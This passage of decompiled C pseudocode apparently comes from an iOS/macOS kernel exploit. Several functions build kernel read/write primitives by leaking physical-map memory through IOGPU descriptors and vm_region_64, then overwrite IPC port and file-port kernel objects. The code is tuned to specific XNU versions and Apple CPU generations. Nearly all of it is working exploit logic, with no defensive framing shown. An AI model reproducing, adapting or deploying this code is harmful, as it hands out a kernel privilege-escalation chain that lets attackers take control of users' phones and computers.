              if ( !(unsigned int)krw_read_thunk(
                                    krwCtx,
                                    8LL * (unsigned int)((unsigned __int64)(v170 - *(uint64_t *)a1) >> vm_page_shift)
                                  + *(uint64_t *)v319,
                                    8,
                                    &v316) )
                goto LABEL_487;
              v171 = v316 & 3;
              if ( (v316 & 3) != 0 )
              {
                if ( v171 == 2 )
                {
                  v172 = v293 + v156;
                  if ( ((v316 & 0xFFFFFFFFFFFCLL) | 0xFFFF000000000000LL) == v157 - (((v293 + v156) >> 9) & 0x18) )
                    goto LABEL_364;
                  goto LABEL_367;
                }
                if ( v171 != 3 )
                  goto LABEL_364;
              }
              v172 = v293 + v156;
LABEL_367:
              if ( (*(uint64_t *)(v5 + 392) & v172) == 0 )
              {
                v173 = setup_vm_for_kwrite(krwCtx, v4, v263);
                if ( (uint32_t)v173 )
                {
                  v10 = v173;
                  goto LABEL_500;
                }
              }
              if ( !(unsigned int)kwrite_with_retry(v5, v157, (__int64)&outputStructCnt, 8) )
                goto LABEL_370;
LABEL_364:
              v156 += v277;
            }
            while ( v156 < v284 );
          }
        }
        v139 = vm_deallocate(mach_task_self_, v293, v296);
        if ( v139 || (v272 + 1 > 1 && (v139 = mach_port_deallocate(mach_task_self_, v272)) != 0) )
        {
          v10 = v139 | 0x80000000;
          break;
        }
        for ( ii = 0; ii != 512; ii += 8 )
        {
          v141 = *(uint64_t *)&__handleb[ii];
          if ( v141 )
          {
            vm_deallocate(mach_task_self_, v141, vm_page_size);
            *(uint64_t *)&__handleb[ii] = 0;
          }
        }
        for ( jj = 0; jj != 128; jj += 8 )
        {
          v143 = *(uint64_t *)(v131 + jj);
          if ( v143 )
          {
            vm_deallocate(mach_task_self_, v143, v296);
            *(uint64_t *)(v131 + jj) = 0;
          }
        }
        bzero(theDictc, 0x2B0u);
        v10 = 0;
      }
    }
    v144 = 0;
    v145 = 1;
    while ( 2 )
    {
      v146 = v145;
      v147 = v4 + 16 * v130 + 8 * v144;
      v148 = *(uint64_t *)(v147 + 11024);
      if ( !v148 )
      {
LABEL_304:
        v145 = 0;
        v144 = 1;
        if ( (v146 & 1) == 0 )
          goto LABEL_307;
        continue;
      }
      break;
    }
    v149 = vm_deallocate(mach_task_self_, v148, vm_page_size);
    if ( !v149 )
    {
      *(uint64_t *)(v147 + 11024) = 0;
      goto LABEL_304;
    }
    v10 = v149 | 0x80000000;
LABEL_307:
    ++v130;
    __handleb += 688;
    v131 += 688;
    if ( v130 != 16 )
      continue;
    break;
  }
LABEL_500:
  v217 = *v260;
  if ( *v260 )
  {
    v218 = 0;
    v219 = v4 + 13892;
    do
    {
      v220 = *(uint32_t *)(v219 + 4 * v218);
      if ( v220 + 1 >= 2 )
      {
        mach_port_deallocate(mach_task_self_, v220);
        *(uint32_t *)(v219 + 4 * v218) = 0;
        v217 = *v260;
      }
      ++v218;
    }
    while ( v218 < v217 );
  }
  *v260 = 0;
  v221 = *(uint32_t *)(v4 + 26184);
  if ( v221 )
  {
    v222 = 0;
    v223 = v4 + 17992;
    do
    {
      v224 = *(uint64_t *)(v223 + 8 * v222);
      if ( v224 )
      {
        vm_deallocate(mach_task_self_, v224, vm_page_size);
        *(uint64_t *)(v223 + 8 * v222) = 0;
        v221 = *(uint32_t *)(v4 + 26184);
      }
      ++v222;
    }
    while ( v222 < v221 );
  }
  *(uint32_t *)(v4 + 26184) = 0;
  v225 = *(uint64_t *)(v5 + 344);
  if ( v225 <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
  {
    if ( v225 >= XNU_VERSION_PACKED(7195, 42, 1, 0, 0) && ((*(uint32_t *)v5 & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) != 0 || v225 >= XNU_VERSION_PACKED(8019, 0, 0, 0, 0)) )
      goto LABEL_532;
    *(uint64_t *)v319 = -1;
    *(uint64_t *)a1 = -1;
    pipe = fd_make_pipe(a1);
    if ( !pipe )
    {
      pipe = setup_two_fds(a1);
      if ( !pipe )
      {
        pipe = fd_make_pipe((int *)v319);
        if ( !pipe )
        {
          v236 = kread_task_struct(krwCtx, mach_task_self_);
          if ( v236 )
          {
            v237 = v236;
            pipe = read_ipc_port_table_entry(krwCtx, v236, a1[0], (unsigned __int64 *)outputStruct);
            if ( !pipe )
            {
              pipe = read_ipc_port_table_entry(krwCtx, v237, v319[0], (unsigned __int64 *)&name);
              if ( !pipe )
              {
                if ( kwrite64(
                       krwCtx,
                       *(uint64_t *)&outputStruct[0].msgh_bits + 16LL,
                       *(__int64 *)&name.msgh_bits) )
                {
                  pipe = 258052;
                  v238 = a1[0];
                  v239 = a1[1];
                  *(uint32_t *)(v5 + 6448) = a1[0];
                  *(uint32_t *)(v5 + 6452) = v239;
                  v240 = v319[0];
                  v241 = v319[1];
                  *(uint32_t *)(v5 + 6456) = v319[0];
                  *(uint32_t *)(v5 + 6460) = v241;
                  if ( v238 != -1 && v239 != -1 && v240 != -1 && v241 != -1 )
                  {
                    pipe = fileport_kobj_vm_attr_check(krwCtx, v238);
                    if ( !pipe )
                    {
                      pipe = fileport_kobj_vm_attr_check(krwCtx, *(uint32_t *)(v5 + 6452));
                      if ( !pipe )
                      {
                        pipe = fileport_kobj_vm_attr_check(krwCtx, *(uint32_t *)(v5 + 6456));
                        if ( !pipe )
                        {
                          pipe = fileport_kobj_vm_attr_check(krwCtx, *(uint32_t *)(v5 + 6460));
                          if ( !pipe )
                          {
LABEL_531:
                            v305 = pipe;
                            goto LABEL_547;
                          }
                        }
                      }
                    }
                  }
                }
                else
                {
                  pipe = 163856;
                }
              }
            }
          }
          else
          {
            pipe = 163878;
          }
        }
      }
    }
    if ( a1[0] != -1 )
      close(a1[0]);
    if ( a1[1] != -1 )
      close(a1[1]);
    if ( v319[0] != -1 )
      close(v319[0]);
    if ( v319[1] != -1 )
      close(v319[1]);
    *(uint64_t *)(v5 + 6456) = -1;
    *(uint64_t *)(v5 + 6448) = -1;
    goto LABEL_531;
  }
  v226 = (*(uint32_t *)v5 & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) != 0 || v225 > XNU_VERSION_PACKED(8020, 99, 1023, 1023, 1023);
  if ( !v226 )
  {
LABEL_532:
    *(uint64_t *)&outputStruct[0].msgh_bits = -1;
    v228 = task_proc_struct_field_offset(krwCtx);
    if ( v228 )
    {
      v229 = v228;
      v314 = 0;
      v230 = fd_make_pipe((int *)outputStruct);
      if ( v230 || (v230 = setup_two_fds((int *)outputStruct)) != 0 )
      {
        v231 = -1;
        v305 = v230;
        goto LABEL_536;
      }
      fd_write((__int64)outputStruct, &v314, 4u);
      fd_read((int *)outputStruct, &v314, 4u);
      v233 = socket(2, 2, 0);
      if ( v233 == -1 )
      {
        v242 = errno;
        v243 = errno;
        if ( v242 < 0 )
          v243 = -v243;
        v305 = v243 | 0x40000000;
        v231 = -1;
LABEL_536:
        v232 = -1;
        goto LABEL_537;
      }
      v231 = v233;
      v234 = open("/private/etc/group", 0);
      if ( v234 == -1 )
      {
        v244 = errno;
        v245 = errno;
        if ( v244 < 0 )
          v245 = -v245;
        v305 = v245 | 0x40000000;
        v232 = -1;
        goto LABEL_537;
      }
      v232 = v234;
      if ( !kread_physmap_decorated(krwCtx, *(uint64_t *)(v4 + 11280) + v229, (unsigned __int64 *)&v317) )
        goto LABEL_537;
      v235 = get_ipc_kobject_offset(krwCtx, v317, &outputStructCnt);
      if ( v235 )
        goto LABEL_553;
      if ( *(uint64_t *)(v5 + 544) )
      {
        v246 = outputStructCnt;
LABEL_578:
        if ( !kread_physmap_decorated(
                krwCtx,
                v246 + (int)outputStruct[0].msgh_bits * (__int64)*(int *)(v5 + 360),
                (unsigned __int64 *)&name.msgh_bits)
          || !kread_physmap_decorated(krwCtx, *(uint64_t *)&name.msgh_bits + 16LL, (unsigned __int64 *)a1)
          || !kread_physmap_decorated(krwCtx, *(uint64_t *)a1 + 56LL, (unsigned __int64 *)&v315)
          || !kread_physmap_decorated(krwCtx, v315 + 16, (unsigned __int64 *)&v316) )
        {
          goto LABEL_537;
        }
        if ( validate_kaddr_range(v5, v316) )
        {
          if ( !kread_physmap_decorated(
                  krwCtx,
                  v246 + *(int *)(v5 + 360) * (__int64)v231,
                  (unsigned __int64 *)&name.msgh_bits)
            || !kread_physmap_decorated(krwCtx, *(uint64_t *)&name.msgh_bits + 16LL, (unsigned __int64 *)v319) )
          {
            goto LABEL_537;
          }
          v235 = krw_fd_verify_roundtrip(krwCtx, (int *)outputStruct, *(unsigned __int64 *)v319);
          if ( v235 )
          {
LABEL_553:
            v305 = v235;
            goto LABEL_537;
          }
          if ( kwrite64(krwCtx, *(uint64_t *)&name.msgh_bits + 16LL, v316) )
          {
            v247 = outputStruct[0].msgh_bits;
            msgh_size = outputStruct[0].msgh_size;
            *(uint32_t *)(v5 + 6448) = outputStruct[0].msgh_bits;
            *(uint32_t *)(v5 + 6452) = msgh_size;
            *(uint32_t *)(v5 + 6464) = v231;
            v249 = v316;
            *(uint64_t *)(v5 + 536) = v316;
            v305 = 163841;
            if ( v247 != -1 && msgh_size != -1 )
            {
              if ( v249 )
              {
                v305 = fileport_kobj_vm_attr_check(krwCtx, v247);
                if ( !v305 )
                {
                  v305 = fileport_kobj_vm_attr_check(krwCtx, *(uint32_t *)(v5 + 6452));
                  goto LABEL_620;
                }
              }
            }
            goto LABEL_537;
          }
          v258 = 163856;
        }
        else
        {
          v258 = 163878;
        }
        v305 = v258;
        goto LABEL_537;
      }
      v313 = 0;
      v246 = outputStructCnt;
      if ( kread_physmap_decorated(
             krwCtx,
             outputStructCnt + *(int *)(v5 + 360) * (__int64)v232,
             (unsigned __int64 *)&name.msgh_bits)
        && kread_physmap_decorated(krwCtx, *(uint64_t *)&name.msgh_bits + 16LL, (unsigned __int64 *)a1)
        && kread_physmap_decorated(krwCtx, *(uint64_t *)a1 + 40LL, &v313) )
      {
        v250 = 128;
        if ( *(int *)(v5 + 320) > 8019 )
          v250 = -131072;
        v251 = v250 + v313;
        if ( *(int *)(v5 + 320) <= 8019 )
          v252 = v313 + 1024;
        else
          v252 = v313;
        if ( v251 < v252 )
        {
          v253 = 0;
          v254 = 0;
          do
          {
            v255 = kread_physmap_decorated(krwCtx, v251, &v312);
            if ( v253 )
            {
              if ( !v255 )
                goto LABEL_620;
              v256 = v312;
              if ( (v312 & 0x80000000000000LL) != 0 )
                v256 = v312 | 0xFFFFFF8000000000LL;
              if ( v256 < *(uint64_t *)(v5 + 6632)
                || ((v256 & 3) == 0 ? (v257 = v256 >= *(uint64_t *)(v5 + 6640)) : (v257 = 1), v257) )
              {
                v254 = 0;
                v253 = 0;
              }
              else if ( ++v254 == 7 )
              {
                *(uint64_t *)(v5 + 544) = v253;
                goto LABEL_578;
              }
            }
            else
            {
              if ( !v255 )
                goto LABEL_620;
              if ( v312 == 7 )
                v253 = v251;
              else
                v253 = 0;
            }
            v251 += *(int *)(v5 + 360);
          }
          while ( v251 < v252 );
        }
        v305 = 0;
      }
LABEL_620:
      if ( v305 )
      {
LABEL_537:
        if ( outputStruct[0].msgh_bits != -1 )
          close(outputStruct[0].msgh_bits);
        if ( outputStruct[0].msgh_size != -1 )
          close(outputStruct[0].msgh_size);
        *(uint64_t *)(v5 + 6448) = -1;
        if ( v231 != -1 )
          close(v231);
        *(uint32_t *)(v5 + 6464) = -1;
      }
      else
      {
        v305 = 0;
      }
      if ( v232 != -1 )
        close(v232);
    }
    else
    {
      v305 = 163884;
    }
LABEL_547:
    v10 = v305;
    if ( !v305 )
    {
      *(uint32_t *)(v5 + 232) = 0;
      *(__int128 *)(v5 + 240) = 0u;
      *(__int128 *)(v5 + 256) = 0u;
      *(uint64_t *)(v5 + 272) = 0;
    }
  }
#undef outputStruct
#undef v323
#undef v324
#undef v325
#undef v326
#undef v327
#undef v328
#undef v329
#undef v330
#undef v331
#undef v332
#undef v333
#undef v334
#undef v335
  return v10;
}
// D7C4: conditional instruction was optimized away because w22.4==0
// CEF4: variable 'v3' is possibly undefined
// EAD8: variable 'kobject' is possibly undefined
// ED8C: variable 'v209' is possibly undefined
// EDB0: variable 'v211' is possibly undefined
// 68: using guessed type struct section_64 stru_68;
// 42EC0: using guessed type __int128 xmmword_42EC0;
// 48940: using guessed type __int64 __fastcall __chkstk_darwin(uint64_t, uint64_t);

//----- (000000000000F860) ----------------------------------------------------
__int64 __fastcall ioconnect_kread_physmap(struct_krwCtx *krwCtx, __int64 a2, __int64 a3, unsigned int a4)
{
  uint64_t iogpuCtx; // x23
  uint64_t *descriptor; // x24
  uint64_t *state; // x19
  unsigned __int64 copied; // x26
  unsigned __int64 remaining; // x27
  vm_size_t pageSize; // x8
  vm_address_t fakeRegionBase; // x20
  __int64 queryAddr; // x28
  size_t chunkSize; // x22
  kern_return_t kr; // w0
  __int64 originalDescriptorWord1; // [xsp+28h] [xbp-C8h]
  __int64 originalDescriptorWord3; // [xsp+30h] [xbp-C0h]
  __int64 savedStateWord1; // [xsp+38h] [xbp-B8h]
  mach_port_t object_name; // [xsp+40h] [xbp-B0h] BYREF
  mach_msg_type_number_t infoCnt; // [xsp+44h] [xbp-ACh] BYREF
  int info[9]; // [xsp+48h] [xbp-A8h] BYREF
  vm_size_t size; // [xsp+70h] [xbp-80h] BYREF
  vm_address_t address; // [xsp+78h] [xbp-78h] BYREF
  uint64_t leakBuf[2]; // [xsp+80h] [xbp-70h] BYREF

  iogpuCtx = krwCtx->iogpuCtx;
  if ( !iogpuCtx )
    return 708609;
  descriptor = *(uint64_t **)(iogpuCtx + 13384);
  state = *(uint64_t **)(iogpuCtx + 13400);
  if ( state[3] != descriptor[2] || state[1] != *(uint64_t *)(iogpuCtx + 13392) || descriptor[0] != *(uint64_t *)(iogpuCtx + 13408) )
    return 708642;

  if ( !a4 )
    return 0;

  savedStateWord1 = *(uint64_t *)(iogpuCtx + 13392);
  copied = 0;
  remaining = a4;
  pageSize = vm_page_size;
  fakeRegionBase = descriptor[3] - vm_page_size;
  while ( 1 )
  {
    queryAddr = a2 + copied;
    unsigned __int64 pageOffset = krwCtx->pageMask & queryAddr;
    bool queryAddressPair = pageOffset + 64 <= krwCtx->pageSizeOrSomething
                         || pageOffset + remaining > krwCtx->pageSizeOrSomething;
    address = fakeRegionBase;
    infoCnt = 9;
    state[1] = descriptor[1];
    madvise(*(void **)(iogpuCtx + 11296), 2 * pageSize, 2);
    originalDescriptorWord1 = descriptor[1];
    originalDescriptorWord3 = descriptor[3];
    descriptor[1] = queryAddressPair ? queryAddr - 16 : queryAddr - 78;
    descriptor[3] = fakeRegionBase;
    kr = vm_region_64(mach_task_self_, &address, &size, 9, info, &infoCnt, &object_name);
    descriptor[1] = originalDescriptorWord1;
    descriptor[3] = originalDescriptorWord3;
    state[1] = savedStateWord1;
    ++*(uint64_t *)(iogpuCtx + 13416);
    if ( kr )
      return kr | 0x80000000;

    if ( queryAddressPair )
    {
      chunkSize = remaining >= 0x10 ? 0x10 : remaining;
      leakBuf[0] = address;
      leakBuf[1] = size + address;
    }
    else
    {
      chunkSize = remaining >= 2 ? 2 : remaining;
      LOWORD(leakBuf[0]) = *(uint16_t *)&info[8];
    }
    memcpy((void *)(a3 + copied), leakBuf, chunkSize);
    copied += chunkSize;
    if ( copied >= a4 )
      return 0;
    remaining -= chunkSize;
    savedStateWord1 = state[1];
    pageSize = vm_page_size;
  }
}

//----- (000000000000FAE4) ----------------------------------------------------
__int64 __fastcall physmap_read_rebuild_page(uint64_t *a1, int8x8_t *a2)
{
  vm_size_t v4; // x21
  char v5; // w24
  unsigned __int64 v6; // x8
  unsigned __int64 v7; // x10
  unsigned __int64 v8; // x12
  __int64 v9; // x8
  __int64 v10; // x25
  __int64 v11; // x22
  vm_address_t v12; // x8
  __int64 v13; // x23
  vm_size_t v14; // x23
  kern_return_t v15; // w0
  __int64 v16; // x27
  __int64 v17; // x26
  __int64 v18; // x10
  __int64 v19; // x8
  __int64 v20; // x12
  int8x8_t v21; // x11
  __int64 v22; // x13
  __int64 v23; // x14
  kern_return_t memory_entry; // w0
  uint8x8_t v25; // d0
  bool v26; // zf
  mem_entry_name_port_t object_handle; // [xsp+4h] [xbp-6Ch] BYREF
  vm_size_t size; // [xsp+8h] [xbp-68h] BYREF
  vm_address_t address; // [xsp+10h] [xbp-60h] BYREF
  __int64 __buf; // [xsp+18h] [xbp-58h] BYREF

  v4 = vm_page_size;
  v5 = vm_page_shift;
  __buf = 0;
  arc4random_buf(&__buf, 8u);
  v6 = a1[1];
  v7 = v6 >> 34;
  v8 = v6 >> 33;
  v26 = HIDWORD(v6) == 0;
  v9 = 0x40000;
  if ( !v26 )
    v9 = 0x80000;
  if ( v8 )
    v9 = 0x100000;
  if ( v7 )
    v10 = 0x200000;
  else
    v10 = v9;
  v11 = 708609;
  v12 = a1[1681];
  address = v12;
  if ( v12 )
  {
    v13 = a1[1682];
    if ( v13 )
    {
      madvise((void *)(v12 - v4 + v13), v4, 3);
      v14 = v13 - v4;
      v15 = vm_allocate(mach_task_self_, &address, v14, -905953280);
      if ( v15 )
        return v15 | 0x80000000;
      v16 = 0;
      v11 = 708625;
LABEL_13:
      v17 = v16 & 0x7F;
      if ( v16 )
      {
        if ( (v16 & 0x7F) == 0 )
        {
          v15 = vm_allocate(mach_task_self_, &address, v14, -905953280);
          if ( v15 )
            return v15 | 0x80000000;
        }
      }
      v18 = __buf + v16;
      *(uint64_t *)(address + v4 * v17) = __buf + v16;
      __dsb(0xBu);
      v19 = a2[4].u32[0];
      if ( !(uint32_t)v19 )
        goto LABEL_28;
      v20 = 0;
      v21 = a2[3];
      while ( 1 )
      {
        v22 = 1LL << v20;
        if ( (*(uint64_t *)&v21 & (1LL << v20)) == 0 )
        {
          v23 = *(uint64_t *)(*(uint64_t *)a2 + (unsigned int)((uint32_t)v20 << v5));
          if ( v23 == v18 )
          {
            size = v4;
            object_handle = 0;
            a2[3] = (int8x8_t){ .u64 = { *(uint64_t *)&v21 | v22 } };
            memory_entry = mach_make_memory_entry(
                             mach_task_self_,
                             &size,
                             address + v4 * v17,
                             2097155,
                             &object_handle,
                             0);
            if ( memory_entry )
            {
              v11 = memory_entry | 0x80000000;
            }
            else
            {
              v11 = 0;
              a2[5].i32[0] = object_handle;
            }
            LODWORD(v19) = a2[4].i32[0];
LABEL_28:
            v25 = (uint8x8_t)vcnt_s8(a2[3]);
            v25.i16[0] = vaddlv_u8(v25);
            ++v16;
            v26 = (uint32_t)v19 == v25.i32[0] || (uint32_t)v11 == 0;
            if ( v26 || v16 == v10 )
              return v11;
            goto LABEL_13;
          }
          if ( v23 != a1[1699] )
          {
            *(uint64_t *)&v21 |= v22;
            a2[3] = v21;
          }
        }
        if ( v19 == ++v20 )
          goto LABEL_28;
      }
    }
  }
  return v11;
}

//----- (000000000000FD18) ----------------------------------------------------
__int64 __fastcall check_physmap_page_count(uint32_t *a1, __int64 a2)
{
  unsigned int v2; // w9
  __int64 v3; // x8
  uint8x8_t v4; // d0
  vm_size_t v6; // x20
  char v7; // w22
  __int64 v8; // x23
  vm_address_t v9; // x21
  kern_return_t v10; // w0

  v2 = *(uint32_t *)(a2 + 32);
  v3 = *(uint64_t *)(a2 + 24);
  v4 = (uint8x8_t)vcnt_s8((int8x8_t){ .u64 = { v3 } });
  v4.i16[0] = vaddlv_u8(v4);
  if ( v2 == v4.i32[0] )
    return 0;
  v6 = vm_page_size;
  v7 = vm_page_shift;
  if ( *a1 == 3 && (unsigned int)(*(uint32_t *)(a2 + 36) + 1) < 2 )
    return 0;
  if ( !v2 )
    return 0;
  v8 = 0;
  while ( (v3 & (1LL << v8)) != 0 )
  {
LABEL_10:
    if ( ++v8 >= (unsigned __int64)v2 )
      return 0;
  }
  v9 = *(uint64_t *)a2 + (unsigned int)((uint32_t)v8 << v7);
  v10 = vm_protect(mach_task_self_, v9, v6, 0, 0);
  if ( !v10 )
  {
    v10 = vm_protect(mach_task_self_, v9, v6, 0, 3);
    if ( !v10 )
    {
      v3 = *(uint64_t *)(a2 + 24) | (1LL << v8);
      *(uint64_t *)(a2 + 24) = v3;
      v2 = *(uint32_t *)(a2 + 32);
      goto LABEL_10;
    }
  }
  return v10 | 0x80000000;
}

//----- (000000000000FE30) ----------------------------------------------------
__int64 __fastcall map_sptm_state_page(__int64 a1)
{
  mem_entry_name_port_t v1; // w5
  __int64 v2; // x20
  vm_size_t v3; // x19
  kern_return_t v4; // w0
  int v5; // w8
  vm_address_t address; // [xsp+18h] [xbp-28h] BYREF

  v1 = *(uint32_t *)(a1 + 13552);
  if ( v1 + 1 < 2 )
    return 708609;
  address = 0;
  v3 = vm_page_size;
  v4 = vm_map(mach_task_self_, &address, vm_page_size, 0, 1, v1, 0, 0, 3, 3, 2u);
  if ( v4 )
    return v4 | 0x80000000;
  if ( madvise((void *)address, v3, 3) )
  {
    v5 = errno;
    if ( v5 < 0 )
      v5 = -v5;
    v2 = v5 | 0x40000000u;
  }
  else
  {
    v2 = 0;
  }
  vm_deallocate(mach_task_self_, address, v3);
  return v2;
}

//----- (000000000000FF10) ----------------------------------------------------
__int64 __fastcall get_physmap_region_ptrs(struct_krwCtx *krwCtx, __int64 a2, __int64 a3, uint64_t *a4)
{
  unsigned __int64 v4; // x11
  int *v5; // x8
  int v6; // w10
  int v7; // w14
  int v8; // w11
  int v9; // w12
  int v10; // w13
  __int64 v11; // x9
  __int64 v12; // x8
  bool v13; // cc
  __int64 result; // x0

  v4 = krwCtx->xnuVersionPacked;
  if ( v4 >= XNU_VERSION_PACKED(10002, 2, 13, 0, 0) )
  {
    v5 = (int *)(a2 + 124);
    v6 = *(uint32_t *)(a2 + 124);
    v7 = 2048;
    v8 = 0x1000000;
    v9 = 128;
    v10 = 0x4000;
    v11 = 88LL;
    goto LABEL_23;
  }
  if ( v4 <= XNU_VERSION_PACKED(8796, 142, 1, 700, 13) )
  {
    v5 = (int *)(a2 + 116);
    v6 = *(uint32_t *)(a2 + 116);
    v11 = 80LL;
LABEL_11:
    v13 = v4 > XNU_VERSION_PACKED(10002, 0, 115, 1023, 1023);
    if ( v4 <= XNU_VERSION_PACKED(10002, 0, 115, 1023, 1023) )
      v10 = 0x80000;
    else
      v10 = 0x4000;
    if ( v4 <= XNU_VERSION_PACKED(10002, 0, 115, 1023, 1023) )
      v9 = 4096;
    else
      v9 = 128;
    if ( v4 <= XNU_VERSION_PACKED(10002, 0, 115, 1023, 1023) )
      v8 = 0x20000000;
    else
      v8 = 0x1000000;
    if ( v13 )
      v7 = 2048;
    else
      v7 = 0x10000;
    goto LABEL_23;
  }
  v12 = 116LL;
  if ( krwCtx->xnuMajorVersion < 10002 )
    v12 = 124LL;
  v11 = 80LL;
  if ( krwCtx->xnuMajorVersion < 10002 )
    v11 = 88LL;
  v5 = (int *)(a2 + v12);
  v6 = *v5;
  if ( v4 <= XNU_VERSION_PACKED(10002, 0, 198, 1023, 1023) )
    goto LABEL_11;
  v7 = 2048;
  v8 = 0x1000000;
  v9 = 128;
  v10 = 0x4000;
LABEL_23:
  if ( ((v7 | v10) & ~v6) != 0 )
    return 163857LL;
  *v5 = v9 | v6 | v8;
  if ( a4 )
    *a4 = *(uint64_t *)(a2 + v11);
  result = 0LL;
  *(uint64_t *)(a2 + v11) = a3;
  return result;
}

//----- (000000000001003C) ----------------------------------------------------
__int64 __fastcall iokit_kwrite_via_port(
        struct_krwCtx *krwCtx,
        __int64 a2,
        __int64 a3,
        int a4,
        __int64 a5,
        __int64 a6,
        unsigned __int64 a7)
{
  unsigned __int64 v14; // x0
  vm_size_t v15; // x8
  unsigned __int64 v16; // x8
  unsigned __int64 xnuVersionPacked; // x8
  __int64 v18; // x9
  __int64 result; // x0
  int v20; // w10
  int v21; // w12
  int v22; // w8
  int v23; // [xsp+Ch] [xbp-44h] BYREF

  v14 = kernel_va_base_resolver(krwCtx, 0, &v23);
  if ( !v14 )
    return 708609;
  *(__int128 *)(a5 + 16) = 0u;
  *(__int128 *)(a5 + 32) = 0u;
  *(uint64_t *)(a5 + 48) = 0;
  *(__int128 *)a5 = 0u;
  v15 = a7 / vm_page_size;
  *(uint64_t *)(a5 + 24) = 0;
  *(uint64_t *)(a5 + 48) = v15;
  v16 = (a3 - v14) >> v23;
  *(uint32_t *)(a5 + 44) = 320;
  *(uint32_t *)(a5 + 32) = v16;
  *(uint32_t *)(a5 + 36) = 0x2000000;
  *(uint64_t *)(a2 + 32) = a6;
  if ( !a4 )
    return 0;
  xnuVersionPacked = krwCtx->xnuVersionPacked;
  if ( xnuVersionPacked <= XNU_VERSION_PACKED(10002, 2, 12, 1023, 1023) )
  {
    if ( xnuVersionPacked < XNU_VERSION_PACKED(8796, 142, 1, 700, 14) )
    {
      v18 = 116;
    }
    else
    {
      v18 = 116;
      if ( krwCtx->xnuMajorVersion < 10002 )
        v18 = 124;
    }
  }
  else
  {
    v18 = 124;
  }
  v20 = *(uint32_t *)(a2 + v18);
  if ( xnuVersionPacked <= XNU_VERSION_PACKED(10002, 0, 115, 1023, 1023) )
    v21 = 589824;
  else
    v21 = 18432;
  if ( (v21 & ~v20) != 0 )
    return 163857;
  result = 0;
  if ( xnuVersionPacked <= XNU_VERSION_PACKED(10002, 0, 115, 1023, 1023) )
    v22 = 4096;
  else
    v22 = 128;
  *(uint32_t *)(a2 + v18) = v20 | v22;
  return result;
}

//----- (00000000000101AC) ----------------------------------------------------
void __fastcall cfdict_set_int32(CFMutableDictionaryRef a1, const void *a2)
{
  CFNumberRef v4; // x21
  int valuePtr; // [xsp+Ch] [xbp-24h] BYREF

  valuePtr = 32;
  v4 = CFNumberCreate(0, kCFNumberIntType, &valuePtr);
  CFDictionarySetValue(a1, a2, v4);
  CFRelease(v4);
}

//----- (0000000000010214) ----------------------------------------------------
__int64 __fastcall setup_vm_for_kwrite(struct_krwCtx *krwCtx, __int64 a2, unsigned __int64 a3)
{
  __int64 v5; // x19
  __int64 v6; // x22
  int has_flag; // w0
  __int64 v8; // x8
  unsigned __int64 v9; // x0
  unsigned __int64 v10; // x22
  vm_size_t v11; // x21
  mem_entry_name_port_t v12; // w5
  kern_return_t v14; // w0
  int v15; // w8
  vm_address_t v16; // x9
  vm_address_t v17; // x9
  unsigned __int64 v18; // [xsp+10h] [xbp-70h] BYREF
  __int64 v19; // [xsp+18h] [xbp-68h] BYREF
  uint64_t v20[7]; // [xsp+20h] [xbp-60h] BYREF
  vm_address_t address; // [xsp+58h] [xbp-28h] BYREF

  v5 = 163855;
  if ( (unsigned int)krw_read_thunk(
                       krwCtx,
                       8LL * (unsigned int)((a3 - *(uint64_t *)(a2 + 13568)) >> vm_page_shift) + *(uint64_t *)(a2 + 13576),
                       8,
                       &v19) )
  {
    if ( (~(uint8_t)v19 & 3) != 0 )
      return 708628;
    v6 = v19 & 0xFFFFFFFFFFFCLL;
    has_flag = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A8);
    v8 = 32;
    if ( !has_flag )
      v8 = 8;
    if ( kread_physmap_decorated(krwCtx, v6 + v8 - 0xFFFFFFFFFFE8LL, &v18) )
    {
      v9 = map_physpage_for_kobj(krwCtx, v18 + ((a3 >> 10) & 0xC));
      if ( !v9 )
        return 163878;
      v10 = v9;
      address = 0;
      v11 = vm_page_size;
      v12 = *(uint32_t *)&krwCtx->ioSurfaceMemEntryMaybe;
      if ( v12 + 1 > 1 )
      {
        v14 = vm_map(mach_task_self_, &address, vm_page_size, 0, 1, v12, v9 & ~krwCtx->pageMask, 0, 3, 3, 2u);
        if ( v14 )
          return v14 | 0x80000000;
      }
      else if ( (unsigned int)physmap_map_cached(krwCtx, v9, (__int64)v20) )
      {
        return 0xFFFFFFFFLL;
      }
      v15 = *(uint32_t *)&krwCtx->ioSurfaceMemEntryMaybe;
      if ( (unsigned int)(v15 + 1) >= 2 )
        v16 = address;
      else
        v16 = v20[0];
      v17 = (krwCtx->pageMask & v10) + v16;
      if ( *(uint16_t *)v17 )
      {
        v5 = 0;
        atomic_fetch_add((atomic_ushort *volatile)v17, 0xFFFFu);
        *(uint16_t *)(v17 + 2) = 0x4000;
        v15 = *(uint32_t *)&krwCtx->ioSurfaceMemEntryMaybe;
      }
      else
      {
        v5 = 163857;
      }
      if ( (unsigned int)(v15 + 1) >= 2 )
        vm_deallocate(mach_task_self_, address, v11);
      else
        physmap_unmap_cached(krwCtx, (__int64)v20);
    }
  }
  return v5;
}

//----- (0000000000010414) ----------------------------------------------------
__int64 __fastcall get_ipc_kobject_offset(struct_krwCtx *krwCtx, __int64 a2, unsigned __int64 *a3)
{
  int xnuMajorVersion; // w8
  __int64 result; // x0
  __int64 v7; // x8
  int v9; // w8
  unsigned __int64 v10; // [xsp+8h] [xbp-28h] BYREF

  xnuMajorVersion = krwCtx->xnuMajorVersion;
  result = 163884;
  if ( xnuMajorVersion <= 8791 )
  {
    if ( (unsigned int)(xnuMajorVersion - 8019) >= 2 )
    {
      if ( xnuMajorVersion != 7195 )
        return result;
      v7 = 248;
      goto LABEL_12;
    }
LABEL_10:
    v7 = 256;
    if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
      v7 = 248;
LABEL_12:
    if ( !kread_physmap_decorated(krwCtx, v7 + a2, &v10) )
      return 163855;
    if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) || (v9 = kread_physmap_decorated(krwCtx, v10, &v10), result = 163855, v9) )
    {
      if ( validate_kaddr_range(krwCtx, v10) )
      {
        result = 0;
        *a3 = v10;
      }
      else
      {
        return 163878;
      }
    }
    return result;
  }
  if ( xnuMajorVersion == 8796 || xnuMajorVersion == 8792 )
    goto LABEL_10;
  return result;
}

//----- (0000000000010534) ----------------------------------------------------
